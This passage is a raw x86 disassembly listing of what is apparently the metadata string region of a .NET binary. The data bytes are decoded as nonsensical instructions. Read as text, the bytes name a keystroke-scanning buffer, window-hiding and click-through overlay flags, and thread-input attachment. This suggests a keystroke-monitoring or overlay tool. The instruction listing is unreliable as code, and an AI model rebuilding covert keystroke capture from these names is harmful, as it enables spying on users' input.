10006914:	6f                   	outsl  %ds:(%esi),(%dx)
10006915:	6c                   	insb   (%dx),%es:(%edi)
10006916:	6c                   	insb   (%dx),%es:(%edi)
10006917:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
1000691c:	6e                   	outsb  %ds:(%esi),(%dx)
1000691d:	73 2e                	jae    0x1000694d
1000691f:	47                   	inc    %edi
10006920:	65 6e                	outsb  %gs:(%esi),(%dx)
10006922:	65 72 69             	gs jb  0x1000698e
10006925:	63 00                	arpl   %eax,(%eax)
10006927:	51                   	push   %ecx
10006928:	75 65                	jne    0x1000698f
1000692a:	75 65                	jne    0x10006991
1000692c:	60                   	pusha
1000692d:	31 00                	xor    %eax,(%eax)
1000692f:	62 75 66             	bound  %esi,0x66(%ebp)
10006932:	66 65 72 00          	data16 gs jb 0x10006936
10006936:	62 75 66             	bound  %esi,0x66(%ebp)
10006939:	66 65 72 4c          	data16 gs jb 0x10006989
1000693d:	6f                   	outsl  %ds:(%esi),(%dx)
1000693e:	63 6b 00             	arpl   %ebp,0x0(%ebx)
10006941:	53                   	push   %ebx
10006942:	79 73                	jns    0x100069b7
10006944:	74 65                	je     0x100069ab
10006946:	6d                   	insl   (%dx),%es:(%edi)
10006947:	2e 54                	cs push %esp
10006949:	68 72 65 61 64       	push   $0x64616572
1000694e:	69 6e 67 00 54 68 72 	imul   $0x72685400,0x67(%esi),%ebp
10006955:	65 61                	gs popa
10006957:	64 00 73 63          	add    %dh,%fs:0x63(%ebx)
1000695b:	61                   	popa
1000695c:	6e                   	outsb  %ds:(%esi),(%dx)
1000695d:	54                   	push   %esp
1000695e:	68 72 65 61 64       	push   $0x64616572
10006963:	00 53 79             	add    %dl,0x79(%ebx)
10006966:	73 74                	jae    0x100069dc
10006968:	65 6d                	gs insl (%dx),%es:(%edi)
1000696a:	2e 52                	cs push %edx
1000696c:	75 6e                	jne    0x100069dc
1000696e:	74 69                	je     0x100069d9
10006970:	6d                   	insl   (%dx),%es:(%edi)
10006971:	65 2e 43             	gs cs inc %ebx
10006974:	6f                   	outsl  %ds:(%esi),(%dx)
10006975:	6d                   	insl   (%dx),%es:(%edi)
10006976:	70 69                	jo     0x100069e1
10006978:	6c                   	insb   (%dx),%es:(%edi)
10006979:	65 72 53             	gs jb  0x100069cf
1000697c:	65 72 76             	gs jb  0x100069f5
1000697f:	69 63 65 73 00 49 73 	imul   $0x73490073,0x65(%ebx),%esp
10006986:	56                   	push   %esi
10006987:	6f                   	outsl  %ds:(%esi),(%dx)
10006988:	6c                   	insb   (%dx),%es:(%edi)
10006989:	61                   	popa
1000698a:	74 69                	je     0x100069f5
1000698c:	6c                   	insb   (%dx),%es:(%edi)
1000698d:	65 00 69 73          	add    %ch,%gs:0x73(%ecx)
10006991:	52                   	push   %edx
10006992:	75 6e                	jne    0x10006a02
10006994:	6e                   	outsb  %ds:(%esi),(%dx)
10006995:	69 6e 67 00 6b 65 79 	imul   $0x79656b00,0x67(%esi),%ebp
1000699c:	73 54                	jae    0x100069f2
1000699e:	6f                   	outsl  %ds:(%esi),(%dx)
1000699f:	4d                   	dec    %ebp
100069a0:	6f                   	outsl  %ds:(%esi),(%dx)
100069a1:	6e                   	outsb  %ds:(%esi),(%dx)
100069a2:	69 74 6f 72 00 53 74 	imul   $0x61745300,0x72(%edi,%ebp,2),%esi
100069a9:	61 
100069aa:	72 74                	jb     0x10006a20
100069ac:	00 53 74             	add    %dl,0x74(%ebx)
100069af:	6f                   	outsl  %ds:(%esi),(%dx)
100069b0:	70 00                	jo     0x100069b2
100069b2:	53                   	push   %ebx
100069b3:	63 61 6e             	arpl   %esp,0x6e(%ecx)
100069b6:	4c                   	dec    %esp
100069b7:	6f                   	outsl  %ds:(%esi),(%dx)
100069b8:	6f                   	outsl  %ds:(%esi),(%dx)
100069b9:	70 00                	jo     0x100069bb
100069bb:	53                   	push   %ebx
100069bc:	63 61 6e             	arpl   %esp,0x6e(%ecx)
100069bf:	41                   	inc    %ecx
100069c0:	6c                   	insb   (%dx),%es:(%edi)
100069c1:	6c                   	insb   (%dx),%es:(%edi)
100069c2:	4b                   	dec    %ebx
100069c3:	65 79 73             	gs jns 0x10006a39
100069c6:	00 47 65             	add    %al,0x65(%edi)
100069c9:	74 4b                	je     0x10006a16
100069cb:	65 79 43             	gs jns 0x10006a11
100069ce:	68 61 72 00 47       	push   $0x47007261
100069d3:	65 74 42             	gs je  0x10006a18
100069d6:	75 66                	jne    0x10006a3e
100069d8:	66 65 72 65          	data16 gs jb 0x10006a41
100069dc:	64 4b                	fs dec %ebx
100069de:	65 79 73             	gs jns 0x10006a54
100069e1:	00 49 73             	add    %cl,0x73(%ecx)
100069e4:	4b                   	dec    %ebx
100069e5:	65 79 50             	gs jns 0x10006a38
100069e8:	72 65                	jb     0x10006a4f
100069ea:	73 73                	jae    0x10006a5f
100069ec:	65 64 00 47 57       	gs add %al,%fs:0x57(%edi)
100069f1:	4c                   	dec    %esp
100069f2:	5f                   	pop    %edi
100069f3:	45                   	inc    %ebp
100069f4:	58                   	pop    %eax
100069f5:	53                   	push   %ebx
100069f6:	54                   	push   %esp
100069f7:	59                   	pop    %ecx
100069f8:	4c                   	dec    %esp
100069f9:	45                   	inc    %ebp
100069fa:	00 57 53             	add    %dl,0x53(%edi)
100069fd:	5f                   	pop    %edi
100069fe:	45                   	inc    %ebp
100069ff:	58                   	pop    %eax
10006a00:	5f                   	pop    %edi
10006a01:	4e                   	dec    %esi
10006a02:	4f                   	dec    %edi
10006a03:	41                   	inc    %ecx
10006a04:	43                   	inc    %ebx
10006a05:	54                   	push   %esp
10006a06:	49                   	dec    %ecx
10006a07:	56                   	push   %esi
10006a08:	41                   	inc    %ecx
10006a09:	54                   	push   %esp
10006a0a:	45                   	inc    %ebp
10006a0b:	00 57 53             	add    %dl,0x53(%edi)
10006a0e:	5f                   	pop    %edi
10006a0f:	45                   	inc    %ebp
10006a10:	58                   	pop    %eax
10006a11:	5f                   	pop    %edi
10006a12:	54                   	push   %esp
10006a13:	4f                   	dec    %edi
10006a14:	4f                   	dec    %edi
10006a15:	4c                   	dec    %esp
10006a16:	57                   	push   %edi
10006a17:	49                   	dec    %ecx
10006a18:	4e                   	dec    %esi
10006a19:	44                   	inc    %esp
10006a1a:	4f                   	dec    %edi
10006a1b:	57                   	push   %edi
10006a1c:	00 53 65             	add    %dl,0x65(%ebx)
10006a1f:	74 57                	je     0x10006a78
10006a21:	69 6e 64 6f 77 44 69 	imul   $0x6944776f,0x64(%esi),%ebp
10006a28:	73 70                	jae    0x10006a9a
10006a2a:	6c                   	insb   (%dx),%es:(%edi)
10006a2b:	61                   	popa
10006a2c:	79 41                	jns    0x10006a6f
10006a2e:	66 66 69 6e 69 74 79 	data16 imul $0x7974,0x69(%esi),%bp
10006a35:	00 53 65             	add    %dl,0x65(%ebx)
10006a38:	74 57                	je     0x10006a91
10006a3a:	69 6e 64 6f 77 4c 6f 	imul   $0x6f4c776f,0x64(%esi),%ebp
10006a41:	6e                   	outsb  %ds:(%esi),(%dx)
10006a42:	67 00 47 65          	add    %al,0x65(%bx)
10006a46:	74 57                	je     0x10006a9f
10006a48:	69 6e 64 6f 77 4c 6f 	imul   $0x6f4c776f,0x64(%esi),%ebp
10006a4f:	6e                   	outsb  %ds:(%esi),(%dx)
10006a50:	67 00 53 65          	add    %dl,0x65(%bp,%di)
10006a54:	74 57                	je     0x10006aad
10006a56:	69 6e 64 6f 77 50 6f 	imul   $0x6f50776f,0x64(%esi),%ebp
10006a5d:	73 00                	jae    0x10006a5f
10006a5f:	53                   	push   %ebx
10006a60:	65 74 46             	gs je  0x10006aa9
10006a63:	6f                   	outsl  %ds:(%esi),(%dx)
10006a64:	72 65                	jb     0x10006acb
10006a66:	67 72 6f             	addr16 jb 0x10006ad8
10006a69:	75 6e                	jne    0x10006ad9
10006a6b:	64 57                	fs push %edi
10006a6d:	69 6e 64 6f 77 00 42 	imul   $0x4200776f,0x64(%esi),%ebp
10006a74:	72 69                	jb     0x10006adf
10006a76:	6e                   	outsb  %ds:(%esi),(%dx)
10006a77:	67 57                	addr16 push %edi
10006a79:	69 6e 64 6f 77 54 6f 	imul   $0x6f54776f,0x64(%esi),%ebp
10006a80:	54                   	push   %esp
10006a81:	6f                   	outsl  %ds:(%esi),(%dx)
10006a82:	70 00                	jo     0x10006a84
10006a84:	41                   	inc    %ecx
10006a85:	74 74                	je     0x10006afb
10006a87:	61                   	popa
10006a88:	63 68 54             	arpl   %ebp,0x54(%eax)
10006a8b:	68 72 65 61 64       	push   $0x64616572
10006a90:	49                   	dec    %ecx
10006a91:	6e                   	outsb  %ds:(%esi),(%dx)
10006a92:	70 75                	jo     0x10006b09
10006a94:	74 00                	je     0x10006a96
10006a96:	47                   	inc    %edi
10006a97:	65 74 43             	gs je  0x10006add
10006a9a:	75 72                	jne    0x10006b0e
10006a9c:	72 65                	jb     0x10006b03
10006a9e:	6e                   	outsb  %ds:(%esi),(%dx)
10006a9f:	74 54                	je     0x10006af5
10006aa1:	68 72 65 61 64       	push   $0x64616572
10006aa6:	49                   	dec    %ecx
10006aa7:	64 00 48 57          	add    %cl,%fs:0x57(%eax)
10006aab:	4e                   	dec    %esi
10006aac:	44                   	inc    %esp
10006aad:	5f                   	pop    %edi
10006aae:	54                   	push   %esp
10006aaf:	4f                   	dec    %edi
10006ab0:	50                   	push   %eax
10006ab1:	4d                   	dec    %ebp
10006ab2:	4f                   	dec    %edi
10006ab3:	53                   	push   %ebx
10006ab4:	54                   	push   %esp
10006ab5:	00 53 79             	add    %dl,0x79(%ebx)
10006ab8:	73 74                	jae    0x10006b2e
10006aba:	65 6d                	gs insl (%dx),%es:(%edi)
10006abc:	2e 57                	cs push %edi
10006abe:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
10006ac5:	46                   	inc    %esi
10006ac6:	6f                   	outsl  %ds:(%esi),(%dx)
10006ac7:	72 6d                	jb     0x10006b36
10006ac9:	73 00                	jae    0x10006acb
10006acb:	46                   	inc    %esi
10006acc:	6f                   	outsl  %ds:(%esi),(%dx)
10006acd:	72 6d                	jb     0x10006b3c
10006acf:	00 6f 76             	add    %ch,0x76(%edi)
10006ad2:	65 72 6c             	gs jb  0x10006b41
10006ad5:	61                   	popa
10006ad6:	79 46                	jns    0x10006b1e
10006ad8:	6f                   	outsl  %ds:(%esi),(%dx)
10006ad9:	72 6d                	jb     0x10006b48
10006adb:	00 66 6f             	add    %ah,0x6f(%esi)
10006ade:	72 6d                	jb     0x10006b4d
10006ae0:	54                   	push   %esp
10006ae1:	68 72 65 61 64       	push   $0x64616572
10006ae6:	00 69 73             	add    %ch,0x73(%ecx)
10006ae9:	41                   	inc    %ecx
10006aea:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
10006aee:	65 00 73 68          	add    %dh,%gs:0x68(%ebx)
10006af2:	6f                   	outsl  %ds:(%esi),(%dx)
10006af3:	75 6c                	jne    0x10006b61
10006af5:	64 43                	fs inc %ebx
10006af7:	6c                   	insb   (%dx),%es:(%edi)
10006af8:	6f                   	outsl  %ds:(%esi),(%dx)
10006af9:	73 65                	jae    0x10006b60
10006afb:	00 63 75             	add    %ah,0x75(%ebx)
10006afe:	72 72                	jb     0x10006b72
10006b00:	65 6e                	outsb  %gs:(%esi),(%dx)
10006b02:	74 4d                	je     0x10006b51
10006b04:	6f                   	outsl  %ds:(%esi),(%dx)
10006b05:	64 65 00 67 65       	fs add %ah,%gs:0x65(%edi)
10006b0a:	74 5f                	je     0x10006b6b
10006b0c:	49                   	dec    %ecx
10006b0d:	73 41                	jae    0x10006b50
10006b0f:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
10006b13:	65 00 4d 61          	add    %cl,%gs:0x61(%ebp)
10006b17:	6b 65 43 6c          	imul   $0x6c,0x43(%ebp),%esp
10006b1b:	69 63 6b 54 68 72 6f 	imul   $0x6f726854,0x6b(%ebx),%esp
10006b22:	75 67                	jne    0x10006b8b
10006b24:	68 00 46 6f 72       	push   $0x726f4600
10006b29:	63 65 54             	arpl   %esp,0x54(%ebp)
10006b2c:	6f                   	outsl  %ds:(%esi),(%dx)
10006b2d:	46                   	inc    %esi
10006b2e:	72 6f                	jb     0x10006b9f
10006b30:	6e                   	outsb  %ds:(%esi),(%dx)
10006b31:	74 00                	je     0x10006b33
10006b33:	53                   	push   %ebx
10006b34:	68 6f 77 00 48       	push   $0x4800776f
10006b39:	69 64 65 00 49 73 41 	imul   $0x63417349,0x0(%ebp,%eiz,2),%esp
10006b40:	63 
10006b41:	74 69                	je     0x10006bac
10006b43:	76 65                	jbe    0x10006baa
10006b45:	00 58 00             	add    %bl,0x0(%eax)
10006b48:	59                   	pop    %ecx
10006b49:	00 66 00             	add    %ah,0x0(%esi)
10006b4c:	78 00                	js     0x10006b4e
10006b4e:	79 00                	jns    0x10006b50
10006b50:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
10006b54:	76 6b                	jbe    0x10006bc1
10006b56:	00 73 00             	add    %dh,0x0(%ebx)
10006b59:	66 42                	inc    %dx
10006b5b:	6c                   	insb   (%dx),%es:(%edi)
10006b5c:	6f                   	outsl  %ds:(%esi),(%dx)
10006b5d:	63 6b 49             	arpl   %ebp,0x49(%ebx)
10006b60:	74 00                	je     0x10006b62
10006b62:	62 00                	bound  %eax,(%eax)
10006b64:	68 77 6e 64 00       	push   $0x646e77
10006b69:	68 64 63 00 77       	push   $0x77006364
10006b6e:	00 68 00             	add    %ch,0x0(%eax)
10006b71:	6f                   	outsl  %ds:(%esi),(%dx)
10006b72:	62 6a 00             	bound  %ebp,0x0(%edx)
10006b75:	68 64 63 44 65       	push   $0x65446364
10006b7a:	73 74                	jae    0x10006bf0
10006b7c:	00 68 64             	add    %ch,0x64(%eax)
10006b7f:	63 53 72             	arpl   %edx,0x72(%ebx)
10006b82:	63 00                	arpl   %eax,(%eax)
10006b84:	78 31                	js     0x10006bb7
10006b86:	00 79 31             	add    %bh,0x31(%ecx)
10006b89:	00 6f 70             	add    %ch,0x70(%edi)
10006b8c:	00 77 69             	add    %dh,0x69(%edi)
10006b8f:	64 74 68             	fs je  0x10006bfa
10006b92:	00 68 65             	add    %ch,0x65(%eax)
10006b95:	69 67 68 74 00 68 57 	imul   $0x57680074,0x68(%edi),%esp
10006b9c:	6e                   	outsb  %ds:(%esi),(%dx)
10006b9d:	64 00 74 65 78       	add    %dh,%fs:0x78(%ebp,%eiz,2)
10006ba2:	74 00                	je     0x10006ba4
10006ba4:	63 6f 75             	arpl   %ebp,0x75(%edi)
10006ba7:	6e                   	outsb  %ds:(%esi),(%dx)
10006ba8:	74 00                	je     0x10006baa
10006baa:	70 72                	jo     0x10006c1e
10006bac:	6f                   	outsl  %ds:(%esi),(%dx)
10006bad:	63 65 73             	arpl   %esp,0x73(%ebp)
10006bb0:	73 49                	jae    0x10006bfb
10006bb2:	64 00 53 79          	add    %dl,%fs:0x79(%ebx)
10006bb6:	73 74                	jae    0x10006c2c
10006bb8:	65 6d                	gs insl (%dx),%es:(%edi)
10006bba:	2e 52                	cs push %edx
10006bbc:	75 6e                	jne    0x10006c2c
10006bbe:	74 69                	je     0x10006c29
10006bc0:	6d                   	insl   (%dx),%es:(%edi)
10006bc1:	65 2e 49             	gs cs dec %ecx
10006bc4:	6e                   	outsb  %ds:(%esi),(%dx)
10006bc5:	74 65                	je     0x10006c2c
10006bc7:	72 6f                	jb     0x10006c38
10006bc9:	70 53                	jo     0x10006c1e
10006bcb:	65 72 76             	gs jb  0x10006c44
10006bce:	69 63 65 73 00 4f 75 	imul   $0x754f0073,0x65(%ebx),%esp
10006bd5:	74 41                	je     0x10006c18
10006bd7:	74 74                	je     0x10006c4d
10006bd9:	72 69                	jb     0x10006c44
10006bdb:	62 75 74             	bound  %esi,0x74(%ebp)
10006bde:	65 00 76 4b          	add    %dh,%gs:0x4b(%esi)
10006be2:	65 79 00             	gs jns 0x10006be5
10006be5:	76 6b                	jbe    0x10006c52
10006be7:	43                   	inc    %ebx
10006be8:	6f                   	outsl  %ds:(%esi),(%dx)
10006be9:	64 65 00 64 77 41    	fs add %ah,%gs:0x41(%edi,%esi,2)
10006bef:	66 66 69 6e 69 74 79 	data16 imul $0x7974,0x69(%esi),%bp
10006bf6:	00 6e 49             	add    %ch,0x49(%esi)
10006bf9:	6e                   	outsb  %ds:(%esi),(%dx)
10006bfa:	64 65 78 00          	fs gs js 0x10006bfe
10006bfe:	64 77 4e             	fs ja  0x10006c4f
10006c01:	65 77 4c             	gs ja  0x10006c50
10006c04:	6f                   	outsl  %ds:(%esi),(%dx)
10006c05:	6e                   	outsb  %ds:(%esi),(%dx)
10006c06:	67 00 68 57          	add    %ch,0x57(%bx,%si)
10006c0a:	6e                   	outsb  %ds:(%esi),(%dx)
10006c0b:	64 49                	fs dec %ecx
10006c0d:	6e                   	outsb  %ds:(%esi),(%dx)
10006c0e:	73 65                	jae    0x10006c75
10006c10:	72 74                	jb     0x10006c86
10006c12:	41                   	inc    %ecx
10006c13:	66 74 65             	data16 je 0x10006c7b
10006c16:	72 00                	jb     0x10006c18
10006c18:	63 78 00             	arpl   %edi,0x0(%eax)
10006c1b:	63 79 00             	arpl   %edi,0x0(%ecx)
10006c1e:	75 46                	jne    0x10006c66
10006c20:	6c                   	insb   (%dx),%es:(%edi)
10006c21:	61                   	popa
10006c22:	67 73 00             	addr16 jae 0x10006c25
10006c25:	50                   	push   %eax
10006c26:	72 6f                	jb     0x10006c97
10006c28:	63 65 73             	arpl   %esp,0x73(%ebp)
10006c2b:	73 49                	jae    0x10006c76
10006c2d:	64 00 69 64          	add    %ch,%fs:0x64(%ecx)
10006c31:	41                   	inc    %ecx
10006c32:	74 74                	je     0x10006ca8
10006c34:	61                   	popa
10006c35:	63 68 00             	arpl   %ebp,0x0(%eax)
10006c38:	69 64 41 74 74 61 63 	imul   $0x68636174,0x74(%ecx,%eax,2),%esp
10006c3f:	68 
10006c40:	54                   	push   %esp
10006c41:	6f                   	outsl  %ds:(%esi),(%dx)
10006c42:	00 66 41             	add    %ah,0x41(%esi)
10006c45:	74 74                	je     0x10006cbb
10006c47:	61                   	popa
10006c48:	63 68 00             	arpl   %ebp,0x0(%eax)
10006c4b:	6d                   	insl   (%dx),%es:(%edi)
10006c4c:	6f                   	outsl  %ds:(%esi),(%dx)
10006c4d:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
10006c52:	6d                   	insl   (%dx),%es:(%edi)
10006c53:	70 69                	jo     0x10006cbe
10006c55:	6c                   	insb   (%dx),%es:(%edi)
10006c56:	61                   	popa
10006c57:	74 69                	je     0x10006cc2
10006c59:	6f                   	outsl  %ds:(%esi),(%dx)
10006c5a:	6e                   	outsb  %ds:(%esi),(%dx)
10006c5b:	52                   	push   %edx
10006c5c:	65 6c                	gs insb (%dx),%es:(%edi)
10006c5e:	61                   	popa
10006c5f:	78 61                	js     0x10006cc2
10006c61:	74 69                	je     0x10006ccc
10006c63:	6f                   	outsl  %ds:(%esi),(%dx)
10006c64:	6e                   	outsb  %ds:(%esi),(%dx)
10006c65:	73 41                	jae    0x10006ca8
10006c67:	74 74                	je     0x10006cdd
10006c69:	72 69                	jb     0x10006cd4
10006c6b:	62 75 74             	bound  %esi,0x74(%ebp)
10006c6e:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
10006c72:	6e                   	outsb  %ds:(%esi),(%dx)
10006c73:	74 69                	je     0x10006cde
10006c75:	6d                   	insl   (%dx),%es:(%edi)
10006c76:	65 43                	gs inc %ebx
10006c78:	6f                   	outsl  %ds:(%esi),(%dx)
10006c79:	6d                   	insl   (%dx),%es:(%edi)
10006c7a:	70 61                	jo     0x10006cdd
10006c7c:	74 69                	je     0x10006ce7
10006c7e:	62 69 6c             	bound  %ebp,0x6c(%ecx)
10006c81:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
10006c88:	69 
10006c89:	62 75 74             	bound  %esi,0x74(%ebp)
10006c8c:	65 00 35 78 6c 66 78 	add    %dh,%gs:0x78666c78
10006c93:	71 77                	jno    0x10006d0c
10006c95:	70 00                	jo     0x10006c97
10006c97:	44                   	inc    %esp
10006c98:	6c                   	insb   (%dx),%es:(%edi)
10006c99:	6c                   	insb   (%dx),%es:(%edi)
10006c9a:	49                   	dec    %ecx
10006c9b:	6d                   	insl   (%dx),%es:(%edi)
10006c9c:	70 6f                	jo     0x10006d0d
10006c9e:	72 74                	jb     0x10006d14
10006ca0:	41                   	inc    %ecx
10006ca1:	74 74                	je     0x10006d17
10006ca3:	72 69                	jb     0x10006d0e
10006ca5:	62 75 74             	bound  %esi,0x74(%ebp)
10006ca8:	65 00 75 73          	add    %dh,%gs:0x73(%ebp)
10006cac:	65 72 33             	gs jb  0x10006ce2
10006caf:	32 2e                	xor    (%esi),%ch
10006cb1:	64 6c                	fs insb (%dx),%es:(%edi)
10006cb3:	6c                   	insb   (%dx),%es:(%edi)
10006cb4:	00 2e                	add    %ch,(%esi)
10006cb6:	63 63 74             	arpl   %esp,0x74(%ebx)
10006cb9:	6f                   	outsl  %ds:(%esi),(%dx)
10006cba:	72 00                	jb     0x10006cbc
10006cbc:	67 64 69 33 32 2e 64 	imul   $0x6c642e32,%fs:(%bp,%di),%esi
10006cc3:	6c 
10006cc4:	6c                   	insb   (%dx),%es:(%edi)
10006cc5:	00 49 6e             	add    %cl,0x6e(%ecx)
10006cc8:	74 50                	je     0x10006d1a
10006cca:	74 72                	je     0x10006d3e
10006ccc:	00 5a 65             	add    %bl,0x65(%edx)
10006ccf:	72 6f                	jb     0x10006d40
10006cd1:	00 49 6d             	add    %cl,0x6d(%ecx)
10006cd4:	61                   	popa
10006cd5:	67 65 00 46 72       	add    %al,%gs:0x72(%bp)
10006cda:	6f                   	outsl  %ds:(%esi),(%dx)
10006cdb:	6d                   	insl   (%dx),%es:(%edi)
10006cdc:	48                   	dec    %eax
10006cdd:	62 69 74             	bound  %ebp,0x74(%ecx)
10006ce0:	6d                   	insl   (%dx),%es:(%edi)
10006ce1:	61                   	popa
10006ce2:	70 00                	jo     0x10006ce4
10006ce4:	6f                   	outsl  %ds:(%esi),(%dx)
10006ce5:	70 5f                	jo     0x10006d46
10006ce7:	45                   	inc    %ebp
10006ce8:	71 75                	jno    0x10006d5f
10006cea:	61                   	popa
10006ceb:	6c                   	insb   (%dx),%es:(%edi)
10006cec:	69 74 79 00 67 65 74 	imul   $0x5f746567,0x0(%ecx,%edi,2),%esi
10006cf3:	5f 
10006cf4:	43                   	inc    %ebx
10006cf5:	61                   	popa
10006cf6:	70 61                	jo     0x10006d59
10006cf8:	63 69 74             	arpl   %ebp,0x74(%ecx)
10006cfb:	79 00                	jns    0x10006cfd
10006cfd:	54                   	push   %esp
10006cfe:	6f                   	outsl  %ds:(%esi),(%dx)
10006cff:	53                   	push   %ebx
10006d00:	74 72                	je     0x10006d74
10006d02:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
10006d09:	74 65                	je     0x10006d70
10006d0b:	6d                   	insl   (%dx),%es:(%edi)
10006d0c:	2e 44                	cs inc %esp
10006d0e:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
10006d15:	69 63 73 00 50 72 6f 	imul   $0x6f725000,0x73(%ebx),%esp
10006d1c:	63 65 73             	arpl   %esp,0x73(%ebp)
10006d1f:	73 00                	jae    0x10006d21
10006d21:	47                   	inc    %edi
10006d22:	65 74 50             	gs je  0x10006d75
10006d25:	72 6f                	jb     0x10006d96
10006d27:	63 65 73             	arpl   %esp,0x73(%ebp)
10006d2a:	73 42                	jae    0x10006d6e
10006d2c:	79 49                	jns    0x10006d77
10006d2e:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
10006d32:	74 5f                	je     0x10006d93
10006d34:	50                   	push   %eax
10006d35:	72 6f                	jb     0x10006da6
10006d37:	63 65 73             	arpl   %esp,0x73(%ebp)
10006d3a:	73 4e                	jae    0x10006d8a
10006d3c:	61                   	popa
10006d3d:	6d                   	insl   (%dx),%es:(%edi)
10006d3e:	65 00 54 68 72       	add    %dl,%gs:0x72(%eax,%ebp,2)
10006d43:	65 61                	gs popa
10006d45:	64 53                	fs push %ebx
10006d47:	74 61                	je     0x10006daa
10006d49:	72 74                	jb     0x10006dbf
10006d4b:	00 73 65             	add    %dh,0x65(%ebx)
10006d4e:	74 5f                	je     0x10006daf
10006d50:	49                   	dec    %ecx
10006d51:	73 42                	jae    0x10006d95
10006d53:	61                   	popa
10006d54:	63 6b 67             	arpl   %ebp,0x67(%ebx)
10006d57:	72 6f                	jb     0x10006dc8
10006d59:	75 6e                	jne    0x10006dc9
10006d5b:	64 00 54 68 72       	add    %dl,%fs:0x72(%eax,%ebp,2)
10006d60:	65 61                	gs popa
10006d62:	64 50                	fs push %eax
10006d64:	72 69                	jb     0x10006dcf
10006d66:	6f                   	outsl  %ds:(%esi),(%dx)
10006d67:	72 69                	jb     0x10006dd2
10006d69:	74 79                	je     0x10006de4
10006d6b:	00 73 65             	add    %dh,0x65(%ebx)
10006d6e:	74 5f                	je     0x10006dcf
10006d70:	50                   	push   %eax
10006d71:	72 69                	jb     0x10006ddc
10006d73:	6f                   	outsl  %ds:(%esi),(%dx)
10006d74:	72 69                	jb     0x10006ddf
10006d76:	74 79                	je     0x10006df1
10006d78:	00 4a 6f             	add    %cl,0x6f(%edx)
10006d7b:	69 6e 00 53 74 72 69 	imul   $0x69727453,0x0(%esi),%ebp
10006d82:	6e                   	outsb  %ds:(%esi),(%dx)
10006d83:	67 00 49 73          	add    %cl,0x73(%bx,%di)
10006d87:	4e                   	dec    %esi
10006d88:	75 6c                	jne    0x10006df6
10006d8a:	6c                   	insb   (%dx),%es:(%edi)
10006d8b:	4f                   	dec    %edi
10006d8c:	72 45                	jb     0x10006dd3
10006d8e:	6d                   	insl   (%dx),%es:(%edi)
10006d8f:	70 74                	jo     0x10006e05
10006d91:	79 00                	jns    0x10006d93
10006d93:	4d                   	dec    %ebp
10006d94:	6f                   	outsl  %ds:(%esi),(%dx)
10006d95:	6e                   	outsb  %ds:(%esi),(%dx)
10006d96:	69 74 6f 72 00 45 6e 	imul   $0x746e4500,0x72(%edi,%ebp,2),%esi
10006d9d:	74 
10006d9e:	65 72 00             	gs jb  0x10006da1
10006da1:	45                   	inc    %ebp
10006da2:	6e                   	outsb  %ds:(%esi),(%dx)
10006da3:	71 75                	jno    0x10006e1a
10006da5:	65 75 65             	gs jne 0x10006e0d
10006da8:	00 67 65             	add    %ah,0x65(%edi)
10006dab:	74 5f                	je     0x10006e0c
10006dad:	43                   	inc    %ebx
10006dae:	6f                   	outsl  %ds:(%esi),(%dx)
10006daf:	75 6e                	jne    0x10006e1f
10006db1:	74 00                	je     0x10006db3
10006db3:	44                   	inc    %esp
10006db4:	65 71 75             	gs jno 0x10006e2c
10006db7:	65 75 65             	gs jne 0x10006e1f
10006dba:	00 45 78             	add    %al,0x78(%ebp)
10006dbd:	69 74 00 53 6c 65 65 	imul   $0x7065656c,0x53(%eax,%eax,1),%esi
10006dc4:	70 
10006dc5:	00 43 68             	add    %al,0x68(%ebx)
10006dc8:	61                   	popa
10006dc9:	72 00                	jb     0x10006dcb
10006dcb:	54                   	push   %esp
10006dcc:	6f                   	outsl  %ds:(%esi),(%dx)
10006dcd:	4c                   	dec    %esp
10006dce:	6f                   	outsl  %ds:(%esi),(%dx)
10006dcf:	77 65                	ja     0x10006e36
10006dd1:	72 00                	jb     0x10006dd3
10006dd3:	54                   	push   %esp
10006dd4:	6f                   	outsl  %ds:(%esi),(%dx)
10006dd5:	41                   	inc    %ecx
10006dd6:	72 72                	jb     0x10006e4a
10006dd8:	61                   	popa
10006dd9:	79 00                	jns    0x10006ddb
10006ddb:	43                   	inc    %ebx
10006ddc:	6c                   	insb   (%dx),%es:(%edi)
10006ddd:	65 61                	gs popa
10006ddf:	72 00                	jb     0x10006de1
10006de1:	42                   	inc    %edx
10006de2:	6f                   	outsl  %ds:(%esi),(%dx)
10006de3:	6f                   	outsl  %ds:(%esi),(%dx)
10006de4:	6c                   	insb   (%dx),%es:(%edi)
10006de5:	65 61                	gs popa
10006de7:	6e                   	outsb  %ds:(%esi),(%dx)
10006de8:	00 49 6e             	add    %cl,0x6e(%ecx)
10006deb:	74 33                	je     0x10006e20
10006ded:	32 00                	xor    (%eax),%al
10006def:	3c 50                	cmp    $0x50,%al
10006df1:	72 69                	jb     0x10006e5c
10006df3:	76 61                	jbe    0x10006e56
10006df5:	74 65                	je     0x10006e5c
10006df7:	49                   	dec    %ecx
10006df8:	6d                   	insl   (%dx),%es:(%edi)
10006df9:	70 6c                	jo     0x10006e67
10006dfb:	65 6d                	gs insl (%dx),%es:(%edi)
10006dfd:	65 6e                	outsb  %gs:(%esi),(%dx)
10006dff:	74 61                	je     0x10006e62
10006e01:	74 69                	je     0x10006e6c
10006e03:	6f                   	outsl  %ds:(%esi),(%dx)
10006e04:	6e                   	outsb  %ds:(%esi),(%dx)
10006e05:	44                   	inc    %esp
10006e06:	65 74 61             	gs je  0x10006e6a
10006e09:	69 6c 73 3e 7b 30 34 	imul   $0x3334307b,0x3e(%ebx,%esi,2),%ebp
10006e10:	33 
10006e11:	46                   	inc    %esi
10006e12:	36 34 44             	ss xor $0x44,%al
10006e15:	44                   	inc    %esp
10006e16:	2d 34 37 41 31       	sub    $0x31413734,%eax
10006e1b:	2d 34 33 37 32       	sub    $0x32373334,%eax
10006e20:	2d 39 37 33 42       	sub    $0x42333739,%eax
10006e25:	2d 44 30 41 31       	sub    $0x31413044,%eax
